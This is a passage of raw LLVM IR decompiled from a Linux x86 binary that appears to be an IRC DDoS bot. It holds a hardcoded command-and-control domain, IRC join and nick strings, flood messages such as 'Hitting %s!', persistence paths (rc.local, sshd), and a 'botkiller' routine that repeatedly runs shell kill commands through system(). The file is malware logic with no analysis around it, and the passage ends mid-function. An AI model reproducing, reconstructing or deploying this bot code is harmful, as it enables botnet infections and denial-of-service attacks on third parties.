i8]* @global_var_805100e.136, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8051019.137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8051022.138, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805102b.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8051033.140, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805103e.141, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805104e.142, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8051056.143, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805105e.144, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8051067.145, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8051071.146, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805107d.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805108b.148, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8051099.149, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80510a6.150, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80510b4.151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80510bf.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80510ca.153, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_80510d7.154, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80510e6.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80510f3.156, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8051100.157, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805110c.158, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805111b.159, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805112f.160, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805113b.161, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8051147.162, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8051154.163, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8051162.164, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050c10.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805116b.165, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051174.166, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051179.167, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805117e.168, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051183.169, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051188.170, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805118d.171, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051192.172, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051197.173, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805119c.174, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511a1.175, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511a7.176, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511ad.177, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511b3.178, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511b9.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511bf.180, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511c5.181, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511cb.182, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511d1.183, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511d7.184, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80511dd.185, i32 0, i32 0), i8* bitcast (i32* @global_var_80511e3.186 to i8*), i8* bitcast (i32* @global_var_80511e5.187 to i8*), i8* bitcast (i32* @global_var_80511e7.188 to i8*), i8* bitcast (i32* @global_var_80511e9.189 to i8*), i8* bitcast (i32* @global_var_80511eb.190 to i8*), i8* bitcast (i32* @global_var_80511ed.191 to i8*), i8* bitcast (i32* @global_var_80511ef.192 to i8*), i8* bitcast (i32* @global_var_80511f1.193 to i8*), i8* bitcast (i32* @global_var_80511f3.194 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80511f5.195, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80511f8.196, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80511fb.197, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80511fe.198, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051201.199, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051204.200, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051207.201, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805120a.202, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805120d.203, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051210.204, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051213.205, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051216.206, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8051219.207, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051224.208, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8051229.209, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805122f.210, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051234.211, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051237.212, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805123a.213, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805123d.214, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051240.215, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051243.216, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051246.217, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051249.218, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805124c.219, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805124f.220, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8051253.221, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8051257.222, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805125b.223, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805125f.224, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8051263.225, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8051267.226, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805126b.227, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805126f.228, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8051273.229, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805127c.230, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051281.231, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051286.232, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805128b.233, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8051291.234, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8051298.235, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80512a0.236, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80512a8.237, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80512b0.238, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80512b9.239, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80512c1.240, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80512c8.241, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80512d1.242, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80512d9.243, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80512de.244, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80512e5.245, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80512ec.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80512f3.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80512fa.248, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8051300.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8051309.250, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805130f.251, i32 0, i32 0)]
@global_var_8053ba0.254 = global i32 0
@global_var_8053790.256 = local_unnamed_addr global i32 0
@global_var_8055e2c.257 = local_unnamed_addr global i32 0
@global_var_8051330.258 = constant i32 1966014578
@global_var_8051332.259 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_8055e08.260 = local_unnamed_addr global i32 0
@global_var_8051342.261 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_805135b.262 = constant [4 x i8] c"std\00"
@global_var_8055e28.263 = local_unnamed_addr global i32 0
@global_var_805135f.264 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_805137c.265 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_805132a.266 = constant [6 x i8] c"pices\00"
@global_var_8053424.267 = local_unnamed_addr global [6 x i8]* @global_var_805132a.266
@global_var_8055e10.268 = local_unnamed_addr global i32 0
@global_var_80513de.269 = constant i32 1330446336
@global_var_805139a.270 = constant [4 x i8] c"STD\00"
@global_var_8053440.271 = local_unnamed_addr global [4 x i8]* @global_var_805139a.270
@global_var_8053444.272 = global i32 134515179
@global_var_80513e0.273 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_8055e24.274 = local_unnamed_addr global i32 0
@global_var_80513ef.275 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_80513fc.276 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_8051404.277 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_805378c.278 = local_unnamed_addr global i32 0
@global_var_805140d.283 = constant [14 x i8] c"[linux][i686]\00"
@global_var_8055e14.284 = local_unnamed_addr global i32 0
@global_var_8053780.285 = local_unnamed_addr global i32 0
@global_var_8051314.287 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_805341c.288 = global [22 x i8]* @global_var_8051314.287
@global_var_8055e1c.289 = local_unnamed_addr global i32 0
@global_var_8051438.290 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_805144b.291 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_805145a.293 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8051462.294 = constant i32 1966014561
@global_var_8051464.295 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_8055e18.296 = local_unnamed_addr global i32 0
@global_var_8051472.297 = constant i32 1342177315
@global_var_8051474.298 = constant i32 1396789248
@global_var_8055e0c.299 = local_unnamed_addr global i32 0
@global_var_8051475.300 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_8051480.301 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_80514a9.302 = constant i32 1380253706
@global_var_805141b.303 = constant [4 x i8] c"352\00"
@global_var_8053480.304 = global [4 x i8]* @global_var_805141b.303
@global_var_8053484.305 = global i32 134517207
@global_var_80514ab.306 = constant [6 x i8] c"ERROR\00"
@global_var_8055dd0.307 = local_unnamed_addr global i32 0
@global_var_8055de0.312 = global i32 0
@global_var_80534f0.313 = global i32 0
@global_var_8053ba4.314 = local_unnamed_addr global i32 0
@global_var_8053ba8.315 = local_unnamed_addr global i32 0
@global_var_8053508.316 = local_unnamed_addr global i32 2
@global_var_80534d8.317 = global i32 0
@global_var_80534d4.318 = global i32* bitcast (i16* @global_var_8053520.309 to i32*)
@global_var_80517c0.319 = constant i32 0
@global_var_80517d8.320 = constant [6 x i8] c"(nil)\00"
@global_var_80517de.321 = constant [7 x i8] c"(null)\00"
@global_var_80517e5.322 = constant i32 2949163
@global_var_8051852.324 = constant i32 327688
@global_var_8053720 = external local_unnamed_addr global i32
@global_var_8052aa0.326 = constant i32 65536
@global_var_805184a.327 = constant [8 x i8] c" +0-#'I\00"
@global_var_80517f8.328 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8051835.329 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805182b.330 = constant i32 117506048
@global_var_805181c.331 = constant i32 331776
@global_var_80518a0.332 = constant [8 x i8] c"Success\00"
@global_var_8051876.333 = constant [15 x i8] c"Unknown error \00"
@global_var_8053728.334 = local_unnamed_addr global i32* @global_var_8052aa0.326
@global_var_8055bc0.335 = global i32 0
@global_var_8055be0.336 = global i32 0
@global_var_8055dac.337 = global i32 0
@global_var_8053730.338 = global i32 0
@global_var_80561d4.339 = local_unnamed_addr global i32 0
@global_var_80561c8.340 = global i32 0
@global_var_8053610.341 = global i32 0
@global_var_8055e6c.343 = global i32 0
@global_var_8055e70.344 = local_unnamed_addr global i32 0
@global_var_8055e74.345 = global i32 0
@global_var_8055e80.346 = local_unnamed_addr global i32 0
@global_var_8056174.347 = global i32 0
@global_var_805619c.348 = local_unnamed_addr global i32 0
@global_var_805618c.349 = local_unnamed_addr global i32 0
@global_var_8056190.350 = local_unnamed_addr global i32 0
@global_var_8056194.351 = local_unnamed_addr global i32 0
@global_var_80561b0.352 = local_unnamed_addr global i32 0
@global_var_8056198.353 = local_unnamed_addr global i32 0
@global_var_80561a4.354 = local_unnamed_addr global i32 0
@global_var_80561a8.355 = local_unnamed_addr global i32 0
@global_var_80561b4.356 = local_unnamed_addr global i32 0
@global_var_8056188.357 = local_unnamed_addr global i32 0
@global_var_8056184.359 = local_unnamed_addr global i32 0
@global_var_80561ac.360 = local_unnamed_addr global i32 0
@global_var_8055e7c.361 = local_unnamed_addr global i32 0
@global_var_8053628.362 = global i32 0
@global_var_8053640.364 = global i32 0
@global_var_8053658 = external global i32
@global_var_8053684.366 = global i32 -1726662223
@global_var_8053660.367 = local_unnamed_addr global i32* @global_var_8053684.366
@global_var_805365c.368 = global i32* @global_var_8053684.366
@global_var_8052414.369 = constant i32 0
@global_var_8052400.370 = constant i32 0
@global_var_8052428.371 = constant [3 x i8] c"-c\00"
@global_var_8052430.372 = constant [3 x i8] c"sh\00"
@global_var_805242b.373 = constant [8 x i8] c"/bin/sh\00"
@global_var_8053700.374 = global i32 0
@global_var_8055dc4.375 = local_unnamed_addr global i32 0
@global_var_8055dcc.376 = local_unnamed_addr global i32 0
@global_var_8053000.378 = global i32 -1
@global_var_804d927.379 = constant i32 -294069
@global_var_8055dd4.380 = local_unnamed_addr global i32 0
@global_var_8055dd8.381 = local_unnamed_addr global i32 0
@global_var_805268c.382 = constant [10 x i8] c"/dev/null\00"
@global_var_8055dc8.384 = local_unnamed_addr global i32 0
@global_var_804db0f.386 = constant i32 1928542531
@global_var_804db33.387 = constant i32 1928542531
@global_var_8055e04.388 = local_unnamed_addr global i32 0
@global_var_8055de4.389 = global i32 0
@global_var_8052cb0.391 = constant [4 x i8] c"inf\00"
@global_var_8052cb3.396 = constant i32 1179535616
@global_var_8052cc0.397 = constant i32 2883630
@global_var_80561d8.401 = local_unnamed_addr global i32 0
@global_var_8052d7c.402 = constant i32 1697579054
@global_var_8052db0.403 = constant i32 1868824690
@global_var_8052d7e.404 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_8052d8f.405 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8052da7.406 = constant [11 x i8] c"nameserver\00"
@global_var_8052db2.407 = constant [7 x i8] c"domain\00"
@global_var_8052db9.408 = constant [7 x i8] c"search\00"
@global_var_80561b8.409 = global i32 0
@global_var_80561e0.410 = global i32 0
@global_var_8056260.411 = local_unnamed_addr global i32 0
@global_var_8056264.412 = local_unnamed_addr global i32 0
@global_var_8052dd4.413 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8052dd1.415 = constant [3 x i8] c"%x\00"
@global_var_8052de5.416 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8052df0.417 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8053760.1 = local_unnamed_addr global i8 0
@global_var_80537a0.253 = external global i8*
@global_var_8053784.255 = local_unnamed_addr global i8 0
@global_var_8053788.279 = external global i8*
@global_var_805378b.280 = external local_unnamed_addr global i8*
@global_var_805378a.281 = external local_unnamed_addr global i8*
@global_var_8053789.282 = external global i8*
@global_var_8053418.286 = local_unnamed_addr global i64 577889103807250433
@1 = internal constant [2 x i8] c"/\00"
@global_var_8051458.292 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_8053520.309 = global i16 288
@global_var_8053570.310 = local_unnamed_addr global i16 272
@global_var_805186a.323 = external constant i8*
@global_var_8055e40.342 = global i8 0
@global_var_80561a0.358 = local_unnamed_addr global i8 0
@global_var_8055dc0.363 = local_unnamed_addr global i8 0
@global_var_8055ddc.383 = local_unnamed_addr global i8 0
@global_var_8052ce0.394 = constant x86_fp80* null
@global_var_8055de8.398 = external global i8*
@global_var_8055e00.399 = local_unnamed_addr global i64 0
@global_var_805372c.400 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 44919
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8053760.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8053760.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8053024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8053760.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_8052e04.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_8053010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134518471, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134548356, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804818c = load i32, i32* @ebp, align 4
  store i32 %v0_804818c, i32* %stack_var_-4, align 4
  %v4_804818c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804818c, i32* @ebp, align 4
  %v2_804819b = ptrtoint i32* %stack_var_-88 to i32
  %v2_80481c5 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_8048192

dec_label_pc_8048192:                             ; preds = %dec_label_pc_8048219, %entry
  br label %dec_label_pc_804819b

dec_label_pc_804819b:                             ; preds = %dec_label_pc_8048192, %dec_label_pc_804819b
  %storemerge7 = phi i32 [ 0, %dec_label_pc_8048192 ], [ %v4_8048210, %dec_label_pc_804819b ]
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v1_80481b4 = mul nuw nsw i32 %storemerge7, 4
  %v2_80481b4 = add i32 %v1_80481b4, ptrtoint ([246 x i8*]* @global_var_8053040.252 to i32)
  %v3_80481b4 = inttoptr i32 %v2_80481b4 to i32*
  %v4_80481b4 = load i32, i32* %v3_80481b4, align 4
  %v3_80481c5 = call i32 @strcat(i8* %v2_80481c5, i32 %v4_80481b4)
  %v1_80481d0 = call i32 @__libc_system(i32 %v2_804819b)
  store i32 1819044203, i32* %stack_var_-88, align 4
  %v4_80481ef = load i32, i32* %v3_80481b4, align 4
  %v3_8048200 = call i32 @strcat(i8* %v2_80481c5, i32 %v4_80481ef)
  %v1_804820b = call i32 @__libc_system(i32 %v2_804819b)
  %v4_8048210 = add nuw nsw i32 %storemerge7, 1
  %exitcond = icmp eq i32 %v4_8048210, 9
  br i1 %exitcond, label %dec_label_pc_8048219, label %dec_label_pc_804819b

dec_label_pc_8048219:                             ; preds = %dec_label_pc_804819b
  %v1_8048220 = call i32 @sleep(i32 5)
  br label %dec_label_pc_8048192

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804819b, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804822d = load i32, i32* @ebx, align 4
  store i32 %v0_804822d, i32* %stack_var_-8, align 4
  %v4_8048231 = ptrtoint i8* %arg1 to i32
  %v2_8048234 = load i8, i8* %arg1, align 1
  %v12_804823d = icmp eq i8 %v2_8048234, 42
  br i1 %v12_804823d, label %dec_label_pc_8048265, label %dec_label_pc_8048243

dec_label_pc_8048243:                             ; preds = %entry
  %v12_8048243 = icmp eq i8 %v2_8048234, 63
  br i1 %v12_8048243, label %dec_label_pc_80482b8, label %dec_label_pc_8048249

dec_label_pc_8048249:                             ; preds = %dec_label_pc_8048243
  %v4_8048249 = icmp eq i8 %v2_8048234, 0
  br i1 %v4_8048249, label %dec_label_pc_8048254, label %dec_label_pc_80482f2

dec_label_pc_8048254:                             ; preds = %dec_label_pc_8048249
  %v2_8048257 = load i8, i8* %tmp13, align 1
  %v3_8048257 = zext i8 %v2_8048257 to i32
  br label %dec_label_pc_8048348

dec_label_pc_8048265:                             ; preds = %entry
  %v1_8048268 = add i32 %v4_8048231, 1
  %v4_8048270 = inttoptr i32 %v1_8048268 to i8*
  %v5_8048273 = call i32 @strwildmatch(i8* %v4_8048270, i32 %arg2)
  %v1_8048278 = icmp eq i32 %v5_8048273, 0
  br i1 %v1_8048278, label %dec_label_pc_80482a6, label %dec_label_pc_804827c

dec_label_pc_804827c:                             ; preds = %dec_label_pc_8048265
  %v2_804827f = load i8, i8* %tmp13, align 1
  %v4_8048282 = icmp eq i8 %v2_804827f, 0
  br i1 %v4_8048282, label %dec_label_pc_80482ad, label %dec_label_pc_8048286

dec_label_pc_8048286:                             ; preds = %dec_label_pc_804827c
  %v1_8048289 = add i32 %arg2, 1
  %v5_8048294 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8048289)
  %v1_8048299 = icmp eq i32 %v5_8048294, 0
